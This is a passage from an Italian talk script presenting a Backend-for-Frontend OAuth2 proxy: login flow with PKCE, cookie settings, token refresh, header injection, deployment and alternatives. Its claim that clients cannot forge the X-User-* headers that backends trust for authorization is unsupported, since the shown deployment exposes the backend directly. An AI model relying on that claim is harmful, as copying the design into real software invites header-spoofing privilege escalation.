Se la tua API è su un dominio diverso dal frontend (tipo frontend su app.com e API su api.com), i cookie non vengono inviati automaticamente per motivi di sicurezza. Devi configurare CORS, gestire preflight, e comunque i cookie con SameSite=strict non funzionano cross-domain.

**4. Token refresh**

Gestire il refresh degli access token nel frontend è un casino. Devi controllare costantemente se il token sta per scadere, fare la richiesta di refresh al momento giusto, gestire race conditions se hai più richieste in parallelo, sincronizzare lo stato tra tab multiple...

**5. Logica di sicurezza nel frontend**

Qualsiasi logica di sicurezza nel frontend è solo UX, non vera sicurezza. Un attaccante può bypassare qualsiasi controllo lato client. La vera sicurezza deve essere nel backend.

Tutti questi problemi hanno una soluzione comune: **Backend for Frontend**.

Un BFF è un backend leggero che sta tra il frontend e le API vere. Gestisce OAuth, tiene i token in modo sicuro, fa da proxy per le richieste API. Il frontend diventa "dumb": fa solo richieste al BFF, che si occupa di tutta la sicurezza.

## Slide 19: BFF Architecture - Come Funziona

**Backend for Frontend: il pattern che risolve i problemi delle SPA**

```
┌─────────────┐
│   Browser   │
│   (SPA)     │
└──────┬──────┘
       │ HTTP requests
       │ (cookies automatici)
       ▼
┌─────────────┐
│     BFF     │
│   (Proxy)   │
├─────────────┤
│ • OAuth     │
│ • Cookies   │
│ • Proxy     │
└──────┬──────┘
       │
       ├─────────────┐
       │             │
       ▼             ▼
┌─────────────┐ ┌─────────────┐
│   Identity  │ │   Backend   │
│   Provider  │ │     API     │
└─────────────┘ └─────────────┘
```

**Cosa fa il BFF:**

1. **Gestisce OAuth flow**
   - `/auth/login` → redirect a IdP
   - `/auth/callback` → scambia code per token
   - `/auth/logout` → revoca token

2. **Memorizza token in HTTP-only cookies**
   - `access_token`
   - `refresh_token`
   - `id_token`

3. **Fa da proxy per le API**
   - `/api/*` → proxy a backend
   - Inietta header utente (X-User-Sub, X-User-Email)
   - Gestisce token refresh automaticamente

4. **Semplifica il frontend**
   - Nessuna logica OAuth
   - Nessuna gestione token
   - Solo fetch('/api/...')

**Discorso:**

Il BFF è un pattern architetturale che risolve elegantemente i problemi delle SPA.

L'idea è semplice: metti un backend leggero tra il frontend e tutto il resto. Questo backend:

**1. Gestisce OAuth**

Il frontend non sa nemmeno cos'è OAuth. Quando l'utente clicca "Login", il frontend fa semplicemente `window.location.href = '/auth/login'`. Il BFF gestisce tutto il flusso: redirect all'identity provider, callback, scambio code per token, validazione, tutto.

**2. Memorizza token in modo sicuro**

I token (access, refresh, ID) vengono memorizzati in HTTP-only cookies. Il frontend non li vede mai, non li tocca mai. Sono gestiti automaticamente dal browser.

**3. Fa da proxy**

Tutte le richieste API passano attraverso il BFF. Il frontend fa `fetch('/api/users')`. Il BFF:

- Prende i token dai cookie
- Verifica che siano validi (e li refresha se necessario)
- Estrae informazioni dall'ID token (sub, email, custom claims)
- Fa la richiesta al backend vero, iniettando header tipo `X-User-Sub: user-123`
- Ritorna la risposta al frontend

**4. Semplifica il frontend**

Il frontend diventa stupido (in senso buono). Non ha logica di autenticazione, non gestisce token, non sa niente di OAuth. Fa solo richieste HTTP normali. Se la richiesta ritorna 401, significa che l'utente non è loggato. Fine.

Questo ha vantaggi enormi:

- **Sicurezza**: Tutta la logica sensibile è nel backend
- **Semplicità**: Il frontend è più semplice da sviluppare e mantenere
- **Riusabilità**: Lo stesso BFF può servire frontend diversi (web, mobile)
- **Flessibilità**: Puoi cambiare identity provider senza toccare il frontend

Il BFF non è un'idea nuova. È un pattern raccomandato da OAuth2 best practices per le SPA. Ma pochi lo implementano correttamente.

## Slide 20: Il Mio BFF - Implementazione Concreta

**OAuth2 BFF Proxy: cosa ho costruito**

**Features:**

✅ **Multi-provider**

- AWS Cognito
- Microsoft Entra ID
- Keycloak

✅ **OAuth2 + PKCE completo**

- State parameter validation
- Nonce parameter validation
- Code challenge/verifier

✅ **Cookie sicuri**

- HTTP-only
- Secure
- SameSite (strict per auth, lax per OAuth flow)

✅ **Token management**

- Automatic refresh
- Rotation dei refresh token
- Validazione completa (firma, claims, expiration)

✅ **Proxy intelligente**

- Inietta header utente (X-User-Sub, X-User-Email)
- Custom claims configurabili
- Optional authentication per /api/\*

✅ **Security best practices**

- JWT signature verification con JWKS
- Audience validation
- Sub claim validation tra ID e access token
- Token revocation su logout

**Discorso:**

Ok, dopo tutta questa teoria, vi mostro cosa ho costruito.

Il mio BFF è un proxy riusabile che implementa tutto quello di cui abbiamo parlato. Non è un esempio giocattolo, è production-ready.

**Multi-provider**: Supporta AWS Cognito, Microsoft Entra ID, e Keycloak. Aggiungere altri provider è questione di implementare un'interfaccia. La logica OAuth è astratta e riusabile.

**OAuth2 + PKCE**: Implementa il flusso completo con tutte le protezioni. State parameter per prevenire CSRF, nonce per prevenire replay, PKCE per proteggere l'authorization code. Non ho tagliato angoli.

**Cookie sicuri**: Tutti i cookie hanno gli attributi giusti. I token di autenticazione usano `SameSite=strict` per massima protezione. I cookie del flusso OAuth (state, nonce, code_verifier) usano `SameSite=lax` per permettere il callback dall'identity provider.

**Token management**: Il BFF gestisce automaticamente il refresh dei token. Se l'access token sta per scadere (configurabile, default 5 minuti prima), lo refresha in modo trasparente. I refresh token vengono rotated ad ogni uso. Se rileva riuso, revoca tutto.

**Proxy intelligente**: Tutte le richieste a `/api/*` vengono proxate al backend. Prima di proxare, il BFF:

1. Verifica che i token siano validi
2. Estrae informazioni dall'ID token
3. Inietta header HTTP con queste informazioni

Il backend riceve header tipo:

- `X-User-Sub: user-123`
- `X-User-Email: user@example.com`
- `X-User-Custom-Groups: admin,developers` (se configurato)

Il backend non deve fare niente di complesso. Basta leggere gli header. Niente validazione JWT, niente chiamate a JWKS, niente gestione OAuth. Solo `if (req.headers['x-user-sub']) { ... }`.

**Security**: Ogni JWT viene verificato completamente:

- Firma con chiavi pubbliche da JWKS
- Algoritmo esplicito (configurabile)
- Issuer validation
- Audience validation
- Expiration validation
- Sub claim matching tra ID token e access token

E quando l'utente fa logout, il BFF revoca i token sull'identity provider. Non solo cancella i cookie locali, ma dice all'IdP "questi token non sono più validi". Questo è importante se l'utente ha sessioni su dispositivi multipli.

## Slide 21: BFF Flow - Login Completo

**Sequenza completa di un login con il BFF**

```
1. User clicca "Login" → GET /auth/login

2. BFF genera:
   - state (random)
   - nonce (random)
   - code_verifier (random)
   - code_challenge = SHA256(code_verifier)

3. BFF salva in HTTP-only cookies (SameSite=lax):
   - oauth_state
   - oauth_nonce
   - code_verifier
   - return_to (opzionale)

4. BFF redirect a IdP:
   /authorize?
     client_id=...
     &redirect_uri=.../auth/callback
     &response_type=code
     &scope=openid email profile
     &state=...
     &nonce=...
     &code_challenge=...
     &code_challenge_method=S256

5. User fa login su IdP

6. IdP redirect a /auth/callback?code=...&state=...

7. BFF valida:
   - state URL === oauth_state cookie
   - Se non match → errore (CSRF detected)

8. BFF scambia code per token:
   POST /oauth2/token
   {
     grant_type: "authorization_code",
     code: "...",
     code_verifier: "...",  // dal cookie
     client_id: "...",
     client_secret: "...",
     redirect_uri: "..."
   }

9. IdP valida:
   - SHA256(code_verifier) === code_challenge memorizzato
   - Se match → rilascia token

10. BFF riceve:
    - access_token
    - refresh_token
    - id_token

11. BFF valida ID token:
    - Firma (JWKS)
    - Algoritmo
    - Issuer
    - Audience
    - Expiration
    - Nonce (deve matchare oauth_nonce cookie)

12. BFF salva token in HTTP-only cookies (SameSite=strict):
    - access_token
    - refresh_token
    - id_token

13. BFF cancella cookie OAuth:
    - oauth_state
    - oauth_nonce
    - code_verifier

14. BFF redirect a frontend (o return_to se specificato)

15. User è loggato!
```

**Discorso:**

Questo è il flusso completo, passo per passo. Sembra complicato scritto così, ma nella pratica è fluido e veloce.

Il punto chiave è che ogni step ha uno scopo di sicurezza:

- **State** previene CSRF sul flusso OAuth
- **Nonce** previene replay dell'ID token
- **PKCE** (code_verifier/challenge) previene intercettazione dell'authorization code
- **Cookie HTTP-only** prevengono XSS
- **SameSite=lax** per OAuth cookies permette il callback
- **SameSite=strict** per auth cookies previene CSRF
- **Validazione completa** previene token forgiati o modificati

Ogni protezione copre un vettore di attacco specifico. Insieme, creano un sistema robusto.

E tutto questo è trasparente per il frontend. Il frontend fa solo `window.location.href = '/auth/login'` e poi `fetch('/api/...')`. Non sa niente di OAuth, PKCE, state, nonce, token refresh... niente.

## Slide 22: BFF Flow - API Request

**Cosa succede quando il frontend chiama un'API**

```
1. Frontend: fetch('/api/users')

2. Browser invia automaticamente cookie:
   - access_token
   - refresh_token
   - id_token

3. BFF riceve richiesta

4. BFF estrae token dai cookie

5. BFF verifica access_token:
   - Firma valida?
   - Non scaduto?
   - Issuer corretto?
   - Audience corretto?

6. Se scaduto o sta per scadere:
   a. Usa refresh_token per ottenere nuovo access_token
   b. Salva nuovo access_token in cookie
   c. Salva nuovo refresh_token (rotation)
   d. Invalida vecchio refresh_token

7. BFF estrae claims da id_token:
   - sub → X-User-Sub
   - email → X-User-Email
   - custom claims → X-User-Custom-*

8. BFF fa richiesta a backend:
   GET https://backend.com/users
   Headers:
     X-User-Sub: user-123
     X-User-Email: user@example.com
     X-User-Custom-Groups: admin,developers

9. Backend processa richiesta:
   - Legge header X-User-Sub
   - Applica logica di autorizzazione
   - Ritorna risposta

10. BFF ritorna risposta a frontend

11. Frontend riceve dati
```

**Discorso:**

Questo è il flusso per ogni richiesta API. Sembra lungo, ma è velocissimo perché la maggior parte sono operazioni in memoria.

Il punto chiave è lo step 7-8: il BFF trasforma i token JWT in header HTTP semplici.

Il backend non deve sapere niente di JWT, OAuth, JWKS, validazione... Riceve header HTTP normali con informazioni sull'utente e basta.

Questo semplifica enormemente il backend. Invece di:

```javascript
// Backend senza BFF
const token = req.headers.authorization.split(' ')[1]
const publicKey = await fetchJWKS()
const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'], ... })
if (decoded.exp < Date.now()) { ... }
if (decoded.iss !== 'expected-issuer') { ... }
const userId = decoded.sub
```

Fai semplicemente:

```javascript
// Backend con BFF
const userId = req.headers["x-user-sub"];
if (!userId) return res.status(401).send("Unauthorized");
```

Molto più semplice. E più sicuro, perché la logica complessa di validazione è centralizzata nel BFF invece di essere duplicata in ogni microservizio.

## Slide 23: Custom Claims - Estendere Le Informazioni Utente

**Come passare informazioni custom dal JWT al backend**

**Configurazione:**

```env
CUSTOM_CLAIMS=custom:groups,cognito:groups,department,role
```

**ID Token:**

```json
{
  "sub": "user-123",
  "email": "user@example.com",
  "custom:groups": ["admin", "developers"],
  "cognito:groups": ["eu-users"],
  "department": "Engineering",
  "role": "Senior Developer"
}
```

**Header inviati al backend:**

```
X-User-Sub: user-123
X-User-Email: user@example.com
X-User-Custom-Groups: admin,developers
X-User-Cognito-Groups: eu-users
X-User-Department: Engineering
X-User-Role: Senior Developer
```

**Backend:**

```javascript
const userGroups = req.headers["x-user-custom-groups"]?.split(",") || [];
if (userGroups.includes("admin")) {
  // Admin logic
}
```

**Discorso:**

Una feature che trovo molto utile è la possibilità di estrarre custom claims dal JWT e passarli come header.

Ogni identity provider permette di aggiungere claims custom ai token. Cognito ha `custom:*` e `cognito:*` claims. Entra ID permette di aggiungere claims custom. Keycloak è super flessibile.

Questi claims possono contenere qualsiasi informazione: gruppi, ruoli, department, tenant ID, feature flags...

Il BFF può essere configurato per estrarre questi claims e trasformarli in header HTTP. La configurazione è semplice:

```env
CUSTOM_CLAIMS=custom:groups,department,role
```

Il BFF:

1. Legge questa configurazione
2. Estrae i claims specificati dall'ID token
3. Li trasforma in header con naming convention `X-User-{Claim-Name}`
4. I due punti (`:`) vengono sostituiti con trattini (`-`)

Quindi `custom:groups` diventa `X-User-Custom-Groups`.

Il backend riceve questi header e può usarli per logica di autorizzazione. Niente parsing JWT, niente validazione, solo lettura di header.

Questo è particolarmente utile per RBAC (Role-Based Access Control) o ABAC (Attribute-Based Access Control). Invece di fare query al database per sapere i ruoli dell'utente, li hai già negli header.

Ovviamente, il backend deve fidarsi di questi header. Ma può farlo perché vengono dal BFF, che è parte del tuo sistema, non dal client. Il frontend non può manipolare questi header perché non passa attraverso il BFF, passa attraverso il browser che li aggiunge automaticamente.

## Slide 24: Deployment - Come Usarlo

**Integrare il BFF nel vostro stack**

**Architettura tipica:**

```
┌──────────────────────────────────────┐
│         Load Balancer / CDN          │
└────────────┬─────────────────────────┘
             │
             ├─────────────┬────────────┐
             │             │            │
             ▼             ▼            ▼
      ┌──────────┐   ┌─────────┐  ┌─────────┐
      │ Frontend │   │   BFF   │  │ Backend │
      │  (SPA)   │   │ (Proxy) │  │  (API)  │
      └──────────┘   └─────────┘  └─────────┘
```

**Configurazione minima:**

```env
# Identity Provider
AUTH_PROVIDER=cognito
COGNITO_USER_POOL_ID=eu-west-1_ABC123
COGNITO_USER_POOL_CLIENT_ID=abc123...
COGNITO_USER_POOL_CLIENT_SECRET=xyz789...
COGNITO_AWS_REGION=eu-west-1

# URLs
REDIRECT_URI=https://yourapp.com/auth/callback
LOGOUT_REDIRECT_URI=https://yourapp.com/auth/signout-callback
FRONTEND_REDIRECT_URL=https://yourapp.com
BACKEND_URL=https://api.yourapp.com

# Security
JWT_ALGORITHM=RS256
JWKS_CACHE_MAX_AGE_MS=600000
TOKEN_REFRESH_THRESHOLD_SECONDS=300
```

**Docker:**

```bash
docker run -p 3000:3000 \
  -e AUTH_PROVIDER=cognito \
  -e COGNITO_USER_POOL_ID=... \
  -e BACKEND_URL=https://api.yourapp.com \
  your-bff-image
```

**Discorso:**

Usare il BFF è semplice. È un'applicazione standalone che potete deployare come qualsiasi altro servizio.

**Architettura**: Il BFF sta tra il frontend e il backend. Può essere sulla stessa macchina/container del frontend o separato. L'importante è che il frontend faccia richieste al BFF, non direttamente al backend.

**Configurazione**: Tutto è configurato via environment variables. Niente file di config complessi, niente build-time configuration. Cambiate le env vars e riavviate.

Le configurazioni principali sono:

1. **Identity Provider**: Quale provider usate (Cognito, Entra, Keycloak) e le sue credenziali.

2. **URLs**: Dove redirigere dopo login/logout, dove sta il backend.

3. **Security**: Quale algoritmo JWT, quanto cachare le JWKS, quando refreshare i token.

**Docker**: Il BFF è containerizzato. Potete deployarlo su qualsiasi piattaforma che supporta Docker: ECS, Kubernetes, Cloud Run, App Runner...

**Sviluppo locale**: Per sviluppo locale, potete usare HTTP invece di HTTPS (il BFF rileva automaticamente e non imposta il flag `secure` sui cookie). Ma in produzione, sempre HTTPS.

**Scalabilità**: Il BFF è stateless (a parte le JWKS cache). Potete scalare orizzontalmente senza problemi. Mettete un load balancer davanti e aggiungete istanze.

**Monitoring**: Il BFF logga tutto con Pino. Potete configurare il log level (trace, debug, info, warn, error) e integrare con i vostri sistemi di logging (CloudWatch, Datadog, etc.).

## Slide 25: Cosa NON Fa Il BFF

**Limiti e responsabilità**

**Il BFF NON gestisce:**

❌ **Autorizzazione business logic**

- Quale utente può vedere quali dati
- Permessi granulari su risorse
- Business rules complesse

❌ **Gestione utenti**

- Creazione account
- Password reset
- Profili utente

❌ **Rate limiting**

- Throttling per utente
- Quota management

❌ **Caching**

- Cache delle risposte API
- Cache dei dati utente

❌ **Validazione input**

- Validazione dei dati business
- Sanitizzazione input

**Queste responsabilità sono del backend!**

**Il BFF fa solo:**
✅ Autenticazione (OAuth flow)
✅ Token management (storage, refresh, validation)
✅ Proxy (forward requests con user context)

**Discorso:**

È importante capire cosa il BFF NON fa, perché vedo spesso confusione su questo.

Il BFF non è un API gateway completo. Non è un backend completo. È un proxy specializzato per autenticazione.

**Autorizzazione**: Il BFF verifica che l'utente sia autenticato e passa le sue informazioni al backend. Ma non decide se l'utente può fare una specifica azione. Quello è compito del backend.

Esempio: il BFF sa che l'utente è "user-123". Ma non sa se "user-123" può cancellare il documento "doc-456". Quella logica sta nel backend.

**Gestione utenti**: Il BFF non crea account, non resetta password, non gestisce profili. Quello è compito dell'identity provider (Cognito, Entra, etc.) e del vostro backend se avete logica custom.

**Rate limiting**: Il BFF non fa throttling. Se volete limitare le richieste per utente, fatelo nel backend o in un API gateway dedicato.

**Caching**: Il BFF non cacha le risposte API. Passa le richieste e le risposte in modo trasparente. Se volete caching, fatelo nel backend o con un reverse proxy (Nginx, Varnish).

**Validazione input**: Il BFF non valida i dati business. Se l'utente invia `{"age": -5}`, il BFF lo passa al backend. Il backend deve validare che l'età sia positiva.

Il BFF ha un solo job: gestire l'autenticazione in modo sicuro e semplificare la vita al frontend e al backend. Fa questo job molto bene, ma non prova a fare altro.

Questo è un design intenzionale. Un componente che fa una cosa sola e la fa bene è più facile da capire, testare, e mantenere di un componente che prova a fare tutto.

## Slide 26: Confronto Con Alternative

**BFF vs altre soluzioni**

**1. OAuth nel frontend (SPA pura)**

❌ Client secret esposto o PKCE obbligatorio
❌ Token in localStorage (XSS risk)
❌ Logica complessa nel frontend
❌ Difficile da testare e debuggare
✅ Nessun backend aggiuntivo

**2. Session-based auth tradizionale**

✅ Sicuro (session ID in HTTP-only cookie)
✅ Semplice da capire
❌ Non funziona bene con microservizi
❌ Richiede session storage condiviso
❌ Non standard (ogni app lo fa diversamente)

**3. API Gateway con auth plugin**

✅ Centralizzato
✅ Scalabile
❌ Complesso da configurare
❌ Vendor lock-in
❌ Overkill per app semplici

**4. BFF (questo progetto)**

✅ Sicuro (HTTP-only cookies, PKCE, validazione completa)
✅ Semplice per frontend e backend
✅ Riusabile e configurabile
✅ Standard (OAuth2 + OIDC)
✅ Leggero e facile da deployare
⚠️ Un componente aggiuntivo da gestire

**Discorso:**

Vediamo come il BFF si confronta con altre soluzioni comuni.

**OAuth nel frontend**: È possibile fare OAuth direttamente nel frontend con PKCE. Ma dovete gestire token storage (localStorage = XSS risk), token refresh (complesso), e avete logica di sicurezza nel frontend (non ideale). Il BFF risolve tutti questi problemi.

**Session-based auth**: Le sessioni tradizionali (session ID in cookie, stato nel server) sono sicure e semplici. Ma non scalano bene con microservizi perché ogni servizio deve accedere allo stesso session store. E non sono standard: ogni framework lo fa diversamente. OAuth2 + JWT è uno standard che funziona ovunque.

**API Gateway**: Gateway come Kong, AWS API Gateway, o Apigee possono gestire auth. Ma sono complessi da configurare, spesso costosi, e overkill se avete solo bisogno di auth. Il BFF è più leggero e specifico.

**BFF**: Combina i vantaggi di tutte le soluzioni. Sicuro come le sessioni, standard come OAuth, semplice da usare. L'unico "svantaggio" è che è un componente aggiuntivo, ma è così leggero che il costo è minimo.

Nella mia esperienza, per la maggior parte delle applicazioni web moderne (SPA + API backend), il BFF è la soluzione migliore. Bilanciamento perfetto tra sicurezza, semplicità, e standard.

## Slide 27: Lessons Learned - Cosa Ho Imparato

**Errori comuni e come evitarli**

**1. "OAuth è semplice"**
No. OAuth è pieno di dettagli sottili. State, nonce, PKCE, claim validation... ogni pezzo ha un motivo. Non tagliate angoli.

**2. "localStorage va bene per i token"**
No. Mai. HTTP-only cookies o niente.

**3. "Verifico solo la firma del JWT"**
No. Verificate anche exp, iss, aud, sub. La firma dice solo che il token non è stato modificato, non che è valido per il vostro sistema.

**4. "Il frontend può gestire l'auth"**
Può, ma non dovrebbe. Tutta la logica di sicurezza deve essere nel backend.

**5. "PKCE è solo per app mobile"**
No. PKCE è per tutti. È un layer di sicurezza aggiuntivo senza costi.

**6. "I token non scadono mai"**
Scadono e devono scadere velocemente. Access token: minuti/ore. Refresh token: giorni/settimane con rotation.

**7. "Il client secret è opzionale"**
Per app pubbliche (SPA, mobile), sì. Ma allora PKCE è obbligatorio.

**8. "OAuth risolve tutto"**
OAuth è autenticazione. Autorizzazione è un problema diverso che dovete risolvere voi.

**Discorso:**

Costruendo questo BFF, ho imparato (spesso a mie spese) diverse lezioni.

La più importante: **OAuth sembra semplice ma non lo è**. Ci sono così tanti dettagli, così tanti modi di sbagliare. Ogni parametro (state, nonce, code_challenge) ha un motivo di esistere. Ogni validazione (exp, iss, aud) previene un attacco specifico.

Ho visto (e fatto) tutti questi errori. localStorage per i token? Fatto. Dimenticato di validare l'expiration? Fatto. Confuso ID token e access token? Fatto.

La buona notizia è che una volta che capisci i principi, diventa più chiaro. E una volta che hai un'implementazione corretta (come questo BFF), puoi riusarla senza doverci ripensare ogni volta.

Un'altra lezione: **la sicurezza è un sistema, non una feature**. Non puoi aggiungere "sicurezza" alla fine. Devi pensarci dall'inizio, in ogni decisione architetturale.

E infine: **semplificare è difficile**. Sarebbe stato più facile fare un sistema complesso che fa tutto. Ma un sistema semplice che fa una cosa bene è più prezioso. Il BFF fa solo auth, ma lo fa molto bene.

## Slide 28: Demo - Vediamolo In Azione

**Live demo (o video se non abbiamo ambiente live)**

**Scenario:**

1. Utente visita app
2. Click su "Login"
3. Redirect a Cognito/Entra/Keycloak
4. Login
5. Redirect back
6. Chiamata API con user context
7. Logout

**Cosa osservare:**

- Cookie HTTP-only (non visibili in JS)
- Header X-User-\* nelle richieste API
- Token refresh automatico
- Redirect flow

**DevTools:**

- Application → Cookies (vedere HTTP-only flag)
- Network → Headers (vedere X-User-Sub, etc.)
- Console → `document.cookie` (non vedere i token)

**Discorso:**

Ok, basta teoria. Vediamo il BFF in azione.

[Qui fareste una demo live o mostrereste un video]

Le cose chiave da notare:

1. **Cookie HTTP-only**: Aprite DevTools → Application → Cookies. Vedete i cookie `access_token`, `refresh_token`, `id_token` con il flag HTTP-only. Provate a fare `document.cookie` nella console: non li vedete. Sono inaccessibili a JavaScript.

2. **Header iniettati**: Fate una richiesta API e guardate i Network tab. Nella richiesta che il BFF fa al backend, vedete header tipo `X-User-Sub`, `X-User-Email`. Il frontend non li ha inviati, li ha aggiunti il BFF.

3. **Token refresh**: Se aspettate che l'access token stia per scadere e fate una richiesta, vedete che il BFF fa prima una richiesta a `/oauth2/token` per refreshare, poi fa la richiesta vera. Tutto trasparente.

4. **Logout**: Quando fate logout, vedete che il BFF non solo cancella i cookie, ma fa anche una richiesta all'identity provider per revocare i token. Logout completo.

Il frontend in tutto questo? Fa solo `fetch('/api/users')`. Non sa niente di token, refresh, header... niente. È bellissimo nella sua semplicità.

## Slide 29: Prossimi Passi e Miglioramenti

**Cosa si potrebbe aggiungere**

**Features future:**

🔄 **Più provider**

- Auth0
- Okta
- Google Identity Platform

🔄 **Token introspection**

- Per token opachi
- Validazione real-time

🔄 **Revocation list**

- Blacklist di token compromessi
- Redis/DynamoDB backend

🔄 **Metrics e monitoring**

- Prometheus metrics
- Health checks
- Performance tracking

🔄 **Rate limiting**

- Per utente
- Per endpoint

🔄 **Caching intelligente**

- Cache JWKS più aggressiva
- Cache user info

**Contributi benvenuti!**

**Discorso:**

Il BFF è production-ready ma c'è sempre spazio per miglioramenti.

**Più provider**: Attualmente supporta Cognito, Entra, e Keycloak. Aggiungere Auth0, Okta, o Google sarebbe utile. La struttura è modulare, quindi è relativamente facile.

**Token introspection**: Alcuni sistemi usano token opachi invece di JWT. Supportare introspection endpoint permetterebbe di validare anche quelli.

**Revocation list**: Attualmente, se un token viene compromesso, dovete aspettare che scada. Una blacklist permetterebbe di revocare token immediatamente. Richiederebbe un backend (Redis, DynamoDB) per memorizzare i token revocati.

**Metrics**: Sarebbe utile avere metriche Prometheus per monitorare: quanti login, quanti refresh, quanti errori di validazione, latenza, etc.

**Rate limiting**: Il BFF potrebbe fare rate limiting per utente o per endpoint, proteggendo il backend da abuse.

**Caching**: Le JWKS vengono già cachate, ma si potrebbe fare di più. Cache delle user info, cache delle validazioni, etc.

Se qualcuno è interessato a contribuire, il progetto è open source. Pull request benvenute!

## Slide 30: Conclusioni - Perché Tutto Questo È Importante

**Recap dei punti chiave**

🔐 **Sicurezza non è opzionale**

- XSS, CSRF, MITM sono minacce reali
- Ogni decisione architettuale ha implicazioni di sicurezza

🍪 **Cookie > localStorage**

- HTTP-only cookies proteggono da XSS
- SameSite protegge da CSRF
- Secure protegge da MITM

🎫 **JWT è potente ma pericoloso**

- Validazione completa è obbligatoria
- Storage sicuro è critico
- Algoritmi deboli = game over

🔑 **OAuth2 + PKCE è lo standard**

- Non reinventate l'autenticazione
- Usate protocolli provati
- Implementate tutte le protezioni

🏗️ **BFF semplifica tutto**

- Frontend più semplice
- Backend più semplice
- Sicurezza centralizzata

**Il messaggio finale:**

La sicurezza è difficile. OAuth è complicato. JWT è pieno di trappole.

Ma con l'architettura giusta e le best practices, potete costruire sistemi sicuri senza impazzire.

Il BFF è la mia risposta a questo problema. Spero che vi sia utile.

**Discorso:**

Ok ragazzi, ricapitoliamo.

Abbiamo parlato di un sacco di cose oggi: XSS, CSRF, MITM, cookie, OAuth, PKCE, JWT, vulnerabilità, attacchi, difese...

Può sembrare overwhelming, lo so. Ma il punto è questo: **la sicurezza è importante e non è così difficile se capisci i principi**.

I principi chiave sono:

1. **Non fidarti del client**. Mai. Qualsiasi cosa nel browser può essere manipolata. La sicurezza vera sta nel backend.

2. **Usa standard provati**. OAuth2 e OpenID Connect esistono per un motivo. Non inventate il vostro sistema di autenticazione.

3. **Implementa tutte le protezioni**. State, nonce, PKCE, validazione completa... ogni pezzo ha un motivo. Non tagliate angoli.

4. **Semplifica dove puoi**. Il BFF è un esempio: prende un problema complesso (OAuth nelle SPA) e lo rende semplice spostando la complessità dove appartiene (nel backend).

Ho costruito questo BFF perché ero stanco di vedere (e fare) gli stessi errori. Volevo qualcosa di riusabile, sicuro, e ben documentato.

Spero che questa presentazione vi sia stata utile. Spero che il BFF vi semplifichi la vita. E spero che la prossima volta che implementate autenticazione, penserete a tutto quello di cui abbiamo parlato oggi.
